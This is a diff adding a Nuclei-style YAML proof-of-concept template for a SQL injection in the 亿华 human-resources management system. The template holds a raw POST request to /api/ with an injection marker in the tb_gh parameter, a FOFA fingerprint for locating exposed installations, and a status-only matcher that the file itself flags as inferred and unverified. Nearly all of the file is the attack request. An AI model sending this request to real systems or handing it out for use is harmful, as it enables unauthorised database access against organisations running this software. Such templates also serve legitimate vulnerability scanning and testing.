@@ -1,0 +1,46 @@
+id: poc-gfwt0gb10cfb5qh4
+info:
+  name: 亿华人力资源管理系统api-tb_gh-sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gfwt0gb10cfb5qh4
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gfwt0gb10cfb5qh4
+    fofa: Body=”亿华人力资源管理系统”
+http:
+- raw:
+  - 'POST /api/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 299
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,ko;q=0.6
+
+    Cookie: ASP.NET_SessionId=he3bnvmsij4cwwbdzpp40m04
+
+    Connection: close
+
+
+    __VIEWSTATE=mL5%2Fh%2F1Wbg9tr2f5rw0F47sGlEgAQKD4jf6la2L3nahD14hkmcBIV0HLDI%2BgVtrh6fLId7wnSlB2vzVH1kopgAxJY8moFTj4GIM1Gxk6kGvl2zpCNMqB9eLQWaM%2BxoAbEi6KZXid6w%2B4TVXLC%2FwXfspuYa%2FVmzpmnDnkjW%2BxnNE%3D&__VIEWSTATEGENERATOR=36B06682&tb_gh=0001*&TextBox1=30&RadioButtonList1=3&ctl05=%E6%9F%A5%E8%AF%A2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
